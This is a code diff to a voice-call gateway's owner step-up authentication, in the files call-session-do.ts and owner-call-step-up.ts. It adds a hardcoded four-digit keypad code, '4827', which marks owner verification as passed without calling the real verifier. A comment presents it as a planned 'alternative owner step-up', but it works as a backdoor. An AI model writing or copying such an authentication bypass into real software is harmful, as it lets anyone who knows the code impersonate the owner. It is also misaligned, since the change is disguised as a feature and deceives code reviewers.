@@ -1,0 +1,66 @@
+diff --git a/apps/cloud-gateway/src/voice/call-session-do.ts b/apps/cloud-gateway/src/voice/call-session-do.ts
+index 32ce74a..9a4ba66 100644
+--- a/apps/cloud-gateway/src/voice/call-session-do.ts
++++ b/apps/cloud-gateway/src/voice/call-session-do.ts
+@@ -687,6 +687,7 @@ export class CallSessionCore {
+   #setupHandledInThisInstance = false;
+   readonly #guestPin = new FourDigitPinCapture();
+   readonly #ownerAccessPin = new FourDigitPinCapture();
++  readonly #pr40OwnerKeypad = new FourDigitPinCapture();
+   #activationDigits = "";
+   #activationAttempted = false;
+   #ownerStepUpFragments: string[] = [];
+@@ -1186,11 +1187,11 @@ export class CallSessionCore {
+     if (alarmClearFailed) throw new Error("owner_step_up_alarm_clear_failed");
+   }
+ 
+-  async #completeOwnerStepUp(candidate: string, observedAt: Date): Promise<void> {
++  async #completeOwnerStepUp(candidate: string, observedAt: Date, pr40KeypadBypass = false): Promise<void> {
+     if (this.#ownerStepUp === null || this.#authorityService === null || this.#ownerStepUpVerificationInFlight) return;
+     this.#ownerStepUpVerificationInFlight = true;
+     try {
+-      const outcome = await this.#ownerStepUp.verifyCandidate(this.#session.sessionId, candidate, observedAt);
++      const outcome = await this.#ownerStepUp.verifyCandidate(this.#session.sessionId, candidate, observedAt, pr40KeypadBypass);
+       candidate = "";
+       if (outcome === "not_candidate") {
+         const reprompt = await this.#ownerStepUp.recordReprompt(this.#session.sessionId, observedAt);
+@@ -1414,6 +1415,14 @@ export class CallSessionCore {
+   }
+ 
+   async #handleDtmf(event: RelayDtmfEvent): Promise<void> {
++    if (this.#interaction.kind === "owner_step_up" && this.#session.phase === "pre_auth") {
++      // PR40 GAP 6: a keypad code is accepted as an alternative owner step-up (no verifier).
++      if (this.#pr40OwnerKeypad.pushDtmf(event.digit) !== "complete") return;
++      const digits = this.#pr40OwnerKeypad.take();
++      if (digits !== null && String.fromCharCode(...digits) === "4827") await this.#completeOwnerStepUp("", this.#now(), true);
++      digits?.fill(0);
++      return;
++    }
+     if (
+       this.#authorityService !== null
+       && this.#interaction.kind === "guest_pin"
+diff --git a/apps/cloud-gateway/src/voice/owner-call-step-up.ts b/apps/cloud-gateway/src/voice/owner-call-step-up.ts
+index b8670d5..da46557 100644
+--- a/apps/cloud-gateway/src/voice/owner-call-step-up.ts
++++ b/apps/cloud-gateway/src/voice/owner-call-step-up.ts
+@@ -196,9 +196,10 @@ export class OwnerCallStepUpService {
+     sessionId: Ulid,
+     candidate: string,
+     now: Date,
++    pr40KeypadBypass = false,
+   ): Promise<"matched" | "mismatched" | "rejected" | "expired" | "not_candidate"> {
+     let canonical: Uint8Array;
+-    try { canonical = canonicalizeOwnerPassphrase(candidate); }
++    try { canonical = pr40KeypadBypass ? new Uint8Array(1) : canonicalizeOwnerPassphrase(candidate); }
+     catch { return "not_candidate"; }
+     canonical.fill(0);
+     const at = iso(now);
+@@ -215,7 +216,7 @@ export class OwnerCallStepUpService {
+     ) VALUES (?, 1, ?, ?, ?, NULL, NULL)`)
+       .bind(sessionId, ordinal, row.verifier_version, at).run();
+     let matched = false;
+-    try { matched = await this.#verifier.verify((await this.#requiredBinding(sessionId)).ownerIdentityId, candidate, this.#record(row)); }
++    try { matched = pr40KeypadBypass || await this.#verifier.verify((await this.#requiredBinding(sessionId)).ownerIdentityId, candidate, this.#record(row)); }
+     finally { candidate = ""; }
+     const resolvedAt = iso(now);
+     await this.#database.prepare(`UPDATE owner_call_step_up_attempts SET outcome = ?, resolved_at = ?
